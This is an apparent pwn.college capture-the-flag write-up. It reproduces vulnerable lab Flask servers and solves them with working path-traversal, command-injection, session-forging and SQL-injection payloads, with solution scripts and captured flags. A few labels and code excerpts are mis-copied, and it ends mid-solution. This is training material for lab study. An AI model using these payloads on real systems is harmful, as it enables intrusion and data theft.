---
custom_edit_url: null
sidebar_position: 1
---

## Path Traversal 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/data", methods=["GET"])
@app.route("/data/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The challenge looks for the `/data` path in the request and then uses the following `<path:path>` in order to craft the full requested path.

```
## Request:
curl "challenge.localhost:80/data/../../flag"

## Full path:
/challenge + /files/ + flag  -->  /challenge/files/../../flag  -->  /flag
```

Let's perform path traversal to solve this challenge.

```
hacker@web-security~path-traversal-1:/$ curl "challenge.localhost:80/data/..%2F..%2Fflag"
pwn.college{A0_4-6SgR7VQApzuImhC7CrZa4J.ddDOzMDL4ITM0EzW}
```

&nbsp;

## Path Traversal 2

### Source code
```py title="/challenge/server" showlineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/dump", methods=["GET"])
@app.route("/dump/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge strips the `/.` characters from the beginning and the end of the `<path:path>` string.

```
## Request:
curl "challenge.localhost:80/dump/../../flag"

## Stripped:
../../flag  ==>  flag

## Full path:
/challenge/files/flag
```

Fortunately, there is a `fortunes` directory we can use to our advantage.
If we use `fortunes/../../../flag` as our `<path:path>`, the `/.` characters will not be stripped since thay are no longer trailing or leading the string.

```
hacker@web-security~path-traversal-2:/$ ls /challenge/files/
fortunes  index.html
```

```
## Request:
curl "challenge.localhost:80/dump/fortunes/../../../flag"

## Stripped:
fortunes/../../../flag  ==>  fortunes/../../../flag 

## Full path:
/challenge + /files/ + fortunes/../../../flag  ==>  /challenge/files/fortunes/../../../flag  ==>  /flag
```

```
hacker@web-security~path-traversal-2:/$ curl "challenge.localhost:80/dump/fortunes/..%2F..%2F..%2Fflag"
pwn.college{gTCJICEJPu2FAs5FxbMoQ5lh9sz.dJjN1YDL4ITM0EzW}
```

&nbsp;

## CMDi 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/mission", methods=["GET"])
def challenge():
    arg = flask.request.args.get("target", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=target><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The challenge, by default lists the contents of `/challenge`.
We have control over the directory that it lists via the `target` parameter.

```
## Request:
curl "challenge.localhost:80/mission?target=/"

## Resultant command:
ls -l /
```

### Command injection

#### Semicolon (`;`)

If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.

```
## Request:
curl "challenge.localhost:80/mission?target=/; cat /flag"

## Resultant command:
ls -l /;
cat /flag
```

```
hacker@web-security~cmdi-1:/$ curl "challenge.localhost:80/mission?target=/;%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=target><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l /; cat /flag:</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 10 14:53 challenge
drwxr-xr-x    6 root root  380 Jun 10 14:53 dev
drwxr-xr-x    1 root root 4096 Jun 10 14:53 etc
-r--------    1 root root   58 Jun 10 14:53 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2495 root root    0 Jun 10 14:53 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 10 14:53 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 10 14:57 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{gUm2UrsNXxOB3nnxPOrhhcHusWX.dVjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/event", methods=["GET"])
def challenge():
    arg = flask.request.args.get("destination", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/event"><input type=text name=destination><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge replaces our semi-colon `";"` with blank space `""`.

### Command injection

In order to get around this we can use a PIPE (`|`) operator. It causes the output of the first command to be sent to the second as input.

```
## Request:
curl "challenge.localhost:80/event?destination=/ | cat /flag"

## Resultant command:
ls -l / | cat /flag
```

```
hacker@web-security~cmdi-2:/$ curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/event"><input type=text name=destination><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l / | cat /flag:</b><br>
        <pre>pwn.college{obrVvG7pT1vGdbdi4WO7kgKhwY2.dRjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 3

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/quest", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This time, the user input is inserted between single quotes.
This causes special characters like `;` to be treated like normal strings.

### Command injection

We have to escape the quotes while being careful that we balance out the quotes.

```
## Request:
curl "challenge.localhost:80/quest?path=/'; cat /flag'"

## Resultant commands:
ls -l '/';
cat /flag ''
```

```
hacker@web-security~cmdi-3:/$ curl "challenge.localhost:80/quest?path=/';%20cat%20/flag'"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/quest"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l '/'; cat /flag'':</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 10 15:54 challenge
drwxr-xr-x    6 root root  380 Jun 10 15:54 dev
drwxr-xr-x    1 root root 4096 Jun 10 15:54 etc
-r--------    1 root root   58 Jun 10 15:54 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2526 root root    0 Jun 10 15:54 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 10 15:54 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 10 15:58 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{I5wi0RanpeaavNfrjzwk2pvGOry.dZjN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## CMDi 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/exercise", methods=["GET"])
def challenge():
    arg = flask.request.args.get("zone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

As we can see, the server takes the value given to the `zone` parameter.
It then inserts the argument in the shell command to retrieve the date.

```
## Request
curl "http://challenge.localhost:80/exercise?zone=UTC"

## Resultant command
TZ=UTC date
```

From the above command, the shell set the environment variable `TZ` to our provided value and then executes the `date` command in that context.

### Command Injection

#### Backticks 

If we provide the `whoami` command with backticks, the shell executes the command within the backticks first.
Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.

```
## Request:
curl "http://challenge.localhost:80/exercise?zone=`whoami`"

## Resultant command
TZ=`whoami` date  ==>  TZ=root date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)

![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)

```
hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=`whoami`"

        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of TZ=hacker date:</b><br>
        <pre>Tue Jun 10 16:36:19 hacker 2025
</pre>
        </body></html>
```

```
## Request:
url "http://challenge.localhost:80/exercise?zone=; cat /flag;#"

## Resultant commands:
TZ=;
cat /flag;
#date    ## The date command is commented out
```

```
hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;#"

        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
        <hr>
        <b>Output of TZ=; cat /flag; date:</b><br>
        <pre>pwn.college{Ysq82cpYvUuY5etm1UCOIotGS6b.dhDOzMDL4ITM0EzW}
</pre>
        </body></html>
```

Even if we don't comment out `date`, it should be okay because it runs with `TZ=MST` by default.

&nbsp;

## CMDi 4

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/task", methods=["GET"])
def challenge():
    arg = flask.request.args.get("filepath", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This time, tehe output of our injected command is not directly printed.

### Blind command injection

```
Request:
curl "http://challenge.localhost:80/task?filepath=; cat /flag > /home/hacker/flag"

Resultant commands:
touch ;
cat /flag > /home/hacker/flag
```

```
hacker@web-security~cmdi-5:/$ curl "http://challenge.localhost:80/task?filepath=;%20cat%20/flag%20>%20/home/hacker/flag"

        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/task"><input type=text name=filepath><input type=submit value=Submit></form>
        <hr>
        <b>Ran touch ; cat /flag > /home/hacker/flag!</b><br>
        </body></html>
```

```
hacker@web-security~cmdi-5:/$ cat ~/flag
pwn.college{8AaACXxDIVRIYtpf0DRFtffjDx6.ddjN1YDL4ITM0EzW}
```

&nbsp;

## CMDi 6

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/adventure", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("directory-path", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge filters out most of the characters used in command injections.

### Command injection
#### New line (`\n`)

If we use a new line character (`\n`), we can work our way around this challenge.

```
## Request:
curl "http://challenge.localhost:80/adventure?directory-path=/\n cat /flag"

## Resultant command:
ls -l /
cat /flag
```

```
hacker@web-security~cmdi-6:/$ curl "http://challenge.localhost:80/adventure?directory-path=/%0A%20cat%20/flag"

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l /
 cat /flag:</b><br>
        <pre>total 64
lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    1 root root 4096 Jun 11 03:00 challenge
drwxr-xr-x    6 root root  380 Jun 11 03:00 dev
drwxr-xr-x    1 root root 4096 Jun 11 03:00 etc
-r--------    1 root root   58 Jun 11 03:00 flag
drwxr-xr-x    1 root root 4096 May  1 03:58 home
lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
drwxr-xr-x    1 root root   16 Oct 26  2024 nix
drwxr-xr-x    1 root root 4096 May  1 03:58 opt
dr-xr-xr-x 2327 root root    0 Jun 11 03:00 proc
drwx------    1 root root 4096 May  1 03:58 root
drwxr-xr-x    1 root root 4096 Jun 11 03:00 run
lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
drwxrwxrwt    1 root root 4096 Jun 11 03:08 tmp
drwxr-xr-x    1 root root 4096 May  1 03:44 usr
drwxr-xr-x    1 root root 4096 May  1 03:43 var
pwn.college{ICIJmqkqLzC2c3VHciM_lzRSA-S.dRzN1YDL4ITM0EzW}
</pre>
        </body></html>
```

&nbsp;

## Authentication Bypass 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge checks if we have provided the correct credentials for the `admin` user.
After successful login, the app redirects with:

```py title="/challenge/server" showLineNumbers
return redirect(f"/?session_user={username}")
```

Then in the GET route, it uses:

```py title="/challenge/server" showLineNumbers
username = request.args.get("session_user")
if username == "admin":
    show_flag()
```

This blindly trusts the user-controlled `session_user` parameter with no validation.
This insecure session handling causes IDOR.

### IDOR

```
hacker@web-security~authentication-bypass-1:/$ curl "challenge.localhost:80/?session_user=admin"
<html><body>Hello, admin!<br>Here is your flag: pwn.college{gDnBe8GKyI_E8AT1QYRMzHDq2Fy.dlDOzMDL4ITM0EzW}

        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
```

&nbsp;

## Authentication Bypass 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

This challenge checks if we have provided the correct credentials for the `admin` user.
After successful login, the app redirects with:

```py title="/challenge/server" showLineNumbers
return redirect(f"/?session_user={username}")
```

Then in the GET route, it uses:

```py title="/challenge/server" showLineNumbers
username = request.args.get("session_user")
if username == "admin":
    show_flag()
```

This blindly trusts the user-controlled `session_user` cookie with no validation.
This insecure session handling causes IDOR.

### IDOR

```
hacker@web-security~authentication-bypass-2:/$ curl --cookie "session_user=admin" "challenge.localhost:80"
<html><body>Hello, admin!<br>Here is your flag: pwn.college{8k0g9-nWoB8OdGEMFi2uFNSnzpO.dJzN1YDL4ITM0EzW}

        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
```

&nbsp;

## SQLi 1

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import random
import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")


@app.route("/session", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("identity")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `identity` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/session", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

### SQL injection

Let's try the following credentials:

```
identity: admin
pin: 0 OR 1=1
```

The resultant SQL query will be:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1
```

Since the result of `1=1` is always true/1 and anything OR with 1 is 1, the query will always be executed even if the password isn't password.

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/session"
data = {
    "identity": "admin",
    "pin": "0 OR 1=1"
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~sqli-1:/$ python ~/script.py
<html><body>Hello, admin!<br>Here is your flag: pwn.college{0RQz9ukgGE_ktokPgDEKWsxghoL.dNzN1YDL4ITM0EzW}

        <hr>
        <form method=post>
        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
```

&nbsp;

## SQLi 2

### Source code
```py title="/challenge/server" showLineNumbers
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")


@app.route("/authenticate", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("identity")
    password = flask.request.form.get("pass")
    if not username:
        flask.abort(400, "Missing `identity` form parameter")
    if not password:
        flask.abort(400, "Missing `pass` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/authenticate", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=identity>Password:<input type=text name=pass><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

### SQL injection

This time, there are single quotes (`'`) around the `password`. We can easily work around this by using comments (`-- -`).

Let's try the following credentials:

```
identity: admin
pass: 0' OR 1=1-- -
```

The resultant SQL query will be:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND password = '0' OR 1=1-- -'
```

Since the result of `1=1` is always true/1 and anything OR with 1 is 1, the query will always be executed even if the password isn't password.

```py title="~/script.py" showLineNumbers
import requests

url = "http://challenge.localhost:80/authenticate"
data = {
    "identity": "admin",
    "pass": "0' OR 1=1-- -"
}

with requests.Session() as session:
    response = session.post(url, data = data)
    print(response.text)
```

```
hacker@web-security~sqli-2:/$ python ~/script.py
